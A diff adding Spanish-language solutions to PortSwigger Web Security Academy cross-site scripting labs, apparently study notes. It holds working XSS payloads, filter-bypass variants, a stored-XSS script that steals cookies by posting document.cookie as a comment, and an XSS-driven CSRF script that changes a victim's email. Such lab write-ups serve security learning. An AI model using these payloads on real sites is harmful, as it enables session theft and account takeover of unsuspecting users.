@@ -30,6 +30,145 @@
 
 ## [Cross-site scripting](https://portswigger.net/web-security/cross-site-scripting)
 
+### [Reflected XSS into HTML context with nothing encoded](https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded)
+
+El sitio objetivo tiene una vulnerabilidad en la función de búsqueda, no se realiza un control sobre los términos introducidos por el usuario, permitiendo que este ingrese texto arbitrario (incluyendo código malicioso). Además, el sitio retorna en la respuesta del mensaje HTTP enviado los términos de búsqueda introducidos por el usuario, lo que da lugar a un ataque del tipo "Reflected XSS".
+
+Para resolver este lab, simplemente se escribe un script en el cuadro de búsqueda con el código malicioso a ejecutar (un `alert` en el ejemplo):
+
+```html
+<script>
+  alert("Hello World!");
+</script>
+```
+
+https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded
+
+### [DOM XSS in innerHTML sink using source location.search](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-innerhtml-sink)
+
+```html
+<!-- In query text input -->
+<img src="1" onerror="alert(document.domain)" />
+```
+
+### [Reflected XSS into HTML context with most tags and attributes blocked](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked)
+
+```html
+&apos;&lt;img src="1" on&#101;rror=alert; throw
+document.cookie&lt;/img&gt;&apos;
+```
+
+### [Exploiting cross-site scripting to steal cookies](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies)
+
+El sitio objetivo tiene una vulnerabilidad en la sección de comentarios, que permite cargar código arbitrario que se ejecuta en el momento en que cualquier usuario ingresa a la publicación afectada.
+
+Para resolver este lab, se ingresa como comentario de una públicación un script que se ejecutará cuando la víctima ingrese a la publicación, y generará un nuevo comentario con las cookies robadas a la víctima.
+
+Por último, se debe cargar las cookies robadas en el navegador del atacante e ingresar al sitio objetivo para "ingresar" con las credenciales robadas.
+
+```html
+<script>
+  document.addEventListener("DOMContentLoaded", function () {
+    let cookie = document.cookie;
+    let comment = document.getElementsByName("comment")[0];
+    comment.value = cookie;
+    let name = document.getElementsByName("name")[0];
+    name.value = "1337";
+    let email = document.getElementsByName("email")[0];
+    email.value = "1337@h4xx0r.com";
+    let website = document.getElementsByName("website")[0];
+    website.value = "https://mywebsite.com";
+    let form = document.getElementsByTagName("form")[0];
+    form.submit();
+  });
+</script>
+```
+
+### [Exploiting XSS to perform CSRF](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf)
+
+El sitio objetivo tiene una vulnerabilidad en la sección de comentarios, que permite cargar código arbitrario que y ejecutarlo en el momento en que cualquier usuario ingresa a la publicación afectada. Además, en cada publicación hay un formulario para dejar comentarios que contiene un token CSRF válido, el cual puede ser utilizado para atravesar el control de CSRF.
+
+Para resolver este lab, se escribe un Script que envía un mensaje HTTP, a la ubicación /email/change-email del sitio, con el método POST. En el cuerpo del mensaje, se incorpora el nuevo email y el token CSRF obtenido del formulario de comentarios.
+
+```html
+<form action="/email/change-email" method="POST">
+  <input type="hidden" name="email" value="plz@stap.com" />
+  <input id="changeMe" required="" type="hidden" name="csrf" value="changeMe" />
+</form>
+<script>
+  document.addEventListener("DOMContentLoaded", (event) => {
+    let csrf = document.getElementById("changeMe");
+    let origCsrf = document.forms[1].getElementsByTagName("input")[0];
+    csrf.value = origCsrf.value;
+    document.forms[0].submit();
+  });
+</script>
+```
+
+### [Reflected XSS into a JavaScript string with single quote and backslash escaped](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-single-quote-backslash-escaped)
+
+```javascript
+</script><script>alert(1)</script>
+```
+
+### [Reflected XSS into a JavaScript string with angle brackets HTML encoded](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-html-encoded)
+
+```javascript
+'; alert(1)//
+```
+
+### [Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-double-quotes-encoded-single-quotes-escaped)
+
+```javascript
+\'; alert(1)//
+```
+
+### [Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-template-literal-angle-brackets-single-double-quotes-backslash-backticks-escaped)
+
+```javascript
+<!-- In Query text input -->
+${alert(1)}
+```
+
+### [Reflected XSS into attribute with angle brackets HTML-encoded](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-attribute-angle-brackets-html-encoded)
+
+```javascript
+" autofocus onfocus="alert(document.domain)"
+```
+
+### [Reflected XSS with event handlers and href attributes blocked](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-event-handlers-and-href-attributes-blocked)
+
+```javascript
+<svg
+  width="120"
+  height="120"
+  viewBox="0 0 120 120"
+  version="1.1"
+  xmlns="http://www.w3.org/2000/svg"
+>
+  <a>
+    <text x="10" y="25" width="100" height="100">
+      Hello
+    </text>
+    <animate attributeName="href" values="javascript://%0aalert(1)" />
+  </a>
+</svg>
+```
+
+### [Stored XSS into anchor href attribute with double quotes HTML-encoded](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-href-attribute-double-quotes-html-encoded)
+
+```javascript
+<!-- In Website section -->
+javascript:alert("1337")
+```
+
+### [Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-onclick-event-angle-brackets-double-quotes-html-encoded-single-quotes-backslash-escaped)
+
+```javascript
+<!-- In website section -->
+&apos;-alert(document.domain)-&apos;
+```
+
 ---
 
 ## [Cross-site request forgery (CSRF)](https://portswigger.net/web-security/csrf)
